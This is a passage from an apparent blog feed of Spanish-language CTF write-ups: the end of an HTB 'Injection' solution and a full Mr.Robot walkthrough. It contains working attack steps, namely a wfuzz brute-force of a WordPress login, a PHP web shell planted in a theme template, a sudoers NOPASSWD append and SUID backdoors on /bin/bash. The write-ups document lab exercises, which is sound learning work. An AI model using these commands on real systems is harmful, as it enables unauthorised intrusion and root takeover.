&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;hosts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;tasks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Privilege Escalation&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;chmod u+s /bin/bash&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;become&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Como podemos ver, esto apunta contra el propio localhost de la maquina, y ejecuta el comando a nivel de sistema que le da permiso de ser ejecutado por el user+superuser al binario “/bin/bash”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/InjectionYML.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Acto seguido tenemos 2 opciones, esperar a la tarea &lt;strong&gt;CRON&lt;/strong&gt;, o forzarla, si la queremos forzar, solo copiamos el comando, pero ejecutamos nuesto binario:
&lt;img src=&quot;/assets/img/HTB_Injection/Injection-100.jpeg&quot; alt=&quot;&quot; /&gt;
Como podemos ver, una vez que se ejecuta el permiso del binario cambia a &lt;strong&gt;“-rwsr-sr-x”&lt;/strong&gt;, por lo que para escalar privilegios solo nos queda ejecutar un:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;fin&quot;&gt;FIN&lt;/h2&gt;</content><author><name>Al3xt0r</name></author><category term="CTF" /><category term="HTB" /><category term="Writeup" /><category term="LFI" /><summary></summary></entry><entry><title>Mr.Robot CTF</title><link href="http://localhost:4000/CTF-Mr.Robot/" rel="alternate" type="text/html" title="Mr.Robot CTF" /><published>2023-06-15T00:00:00-05:00</published><updated>2023-06-15T00:00:00-05:00</updated><id>http://localhost:4000/CTF-Mr.Robot</id><content type="html" xml:base="http://localhost:4000/CTF-Mr.Robot/">&lt;h2 class=&quot;lead&quot; id=&quot;comentario&quot;&gt;Comentario:&lt;/h2&gt;
&lt;p&gt;Esta fue de las primeras maquinas que hice, inspirada en la serie &lt;strong&gt;“Mr.Robot”&lt;/strong&gt;. Tiene una forma muy entretenida de resolver, comenzamos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr.Robot1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Lista de lo que se vera en esta machine:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Reconocimiento de puertos&lt;/li&gt;
  &lt;li&gt;Explotacion&lt;/li&gt;
  &lt;li&gt;Escalada de privilegios usando SUDOERS&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 65535 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;IP-De la maquina&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;O si quieres ir a lo loco:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &amp;lt;IP- De la Maquina&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;El caso, veremos puertos interesantes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH&lt;/li&gt;
  &lt;li&gt;80 - Http&lt;/li&gt;
  &lt;li&gt;443 - Https&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ahora lo que haremos sera ver los servicios y las versiones usadas tras los puertos, usando el comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80,443 &amp;lt;IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos ver, tanto el puerto &lt;strong&gt;80,443&lt;/strong&gt; nos llevan a una pagina web:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para optimizar el proceso de enumeracion de directorios, tiraremos de un &lt;strong&gt;Script&lt;/strong&gt;, propio de la herramienta nmap.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http-enum &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; &amp;lt;IP De la Maquina&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver directorios interesantes, como:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;/robots.txt&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/wp-login.php&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si vamos a la ruta robots veremos cosas interesantes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr6.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/Mr.Robot/Mr5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos descargamos lo que parece ser un diccionario, el archivo &lt;strong&gt;fsocity.dic&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Y si lo analizamos, podremos ver que es un diccionario “extenso”:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr7.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/Mr.Robot/Mr8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero si filtramos por el comando “sort”, para ordenar si es que existen cadenas de texto iguales, podremos ver passwords repetidas, asi que eliminaremos eso y nos quedaremos solo con las &lt;strong&gt;unicas&lt;/strong&gt; y lo almacenaremos en un nuevo diccionario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;intrusion&quot;&gt;Intrusion&lt;/h2&gt;

&lt;p&gt;Ahora nos quedaria tirar de un ataque de fuerza bruta contra el directorio de login que descrubrimos anteriormente, “&lt;strong&gt;/wp-login.php&lt;/strong&gt;”&lt;/p&gt;

&lt;p&gt;Si tratamos de testear al usuario, veremos que “&lt;strong&gt;admin&lt;/strong&gt;”” no es un usuario existente:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero si hemos visto la serie, uno de los personajes principales tiene de nombre &lt;strong&gt;“Elliot Alderson”&lt;/strong&gt;, asi que veamos si existe el usuario “&lt;strong&gt;elliot&lt;/strong&gt;”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos ver, el usuario es existente, por lo que trataremos de aplicarle &lt;strong&gt;fuerza bruta&lt;/strong&gt; al campo de la password.
Usando la herramienta &lt;strong&gt;burpsuite&lt;/strong&gt;, interceptaremos la peticion para obtener informacion importante:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver cositas:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;La  cabecera lleva una “Cookie”&lt;/li&gt;
  &lt;li&gt;El campo que queremos bruteforcear se fija en &lt;strong&gt;log=elliot&amp;amp;pwd=Password&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Yo use la herramienta &lt;strong&gt;wfuzz&lt;/strong&gt; para aplicar el ataque, pero puedes usar tranquilamente burpsuite pasandole el diccionario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El comando utilizado fue:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &amp;lt;URL De la Maquina&amp;gt;/wp-login.php &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Cookie: &amp;lt;Cabecera que sacamos del burpsuite&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;log=elliot&amp;amp;pwd=FUZZ&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &amp;lt;Ruta del diccionario que creamos&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Podemos ver que todas nos devuelven un estado 200, y una cantidad de respuesta igual a 3727, menos una password, &lt;strong&gt;“ER28-0652”&lt;/strong&gt;, esta nos devuelve un codigo &lt;strong&gt;302 - FOUND&lt;/strong&gt;. Por lo que esa es nuestra password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos ver, entramos como el usuario Elliot, ahora nos toca buscar dentro de la interfaz algo que nos permita meternos de lleno dentro del servidor.&lt;/p&gt;

&lt;p&gt;Si nos dirigimos a “Appeareance”, podemos ver el codigo que se emplea para cuando se da un &lt;strong&gt;“404 Not Found”&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr15.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/Mr.Robot/Mr16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi que como tenemos opcion de modificar la funcion, le introducimos un codigo php malicioso:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto nos permite ejecutar codigo directamente en el sistema, usando php como interprete.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que nos queda introducir nuestra reverse shell y ganar acceso a la maquina:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entonces, nos queda buscar si existen binarios con permisos &lt;strong&gt;SUID&lt;/strong&gt; o similares:&lt;/p&gt;

&lt;h2 id=&quot;escalada-de-privilegios-privesc&quot;&gt;Escalada de Privilegios (PRIVESC)&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver que tenemos un binario de &lt;strong&gt;nmap&lt;/strong&gt;, pero si vemos la version, vamos a toparnos con que es muy desactualizada, asi que vamos a nuestra pagina de confianza &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;GTFOBINS&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos el comando binario como nos lo indica, y podemos ejecutar comandos como root:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/MrRobot21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En este caso, podemos explotar el fichero de &lt;strong&gt;/etc/sudoers&lt;/strong&gt;, para no introducir password, o podemos darle permisos de super usuario al binario de &lt;strong&gt;/bin/bash&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;Para el sudoers:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ALL ALL=(ALL) NOPASSWD: ALL&quot;&lt;/span&gt; | tee &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; /etc/sudoers
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Para el binario de &lt;strong&gt;bash&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod u+s /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Para finalizar, si estas en &lt;strong&gt;TryHackMe&lt;/strong&gt;, aqui te doy la forma rapida de tener las llaves:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;fin&quot;&gt;FIN&lt;/h2&gt;</content><author><name>Al3xt0r</name></author><category term="CTF" /><category term="VulnHub" /><summary>Comentario:
Esta fue de las primeras maquinas que hice, inspirada en la serie “Mr.Robot”. Tiene una forma muy entretenida de resolver, comenzamos:</summary></entry></feed>
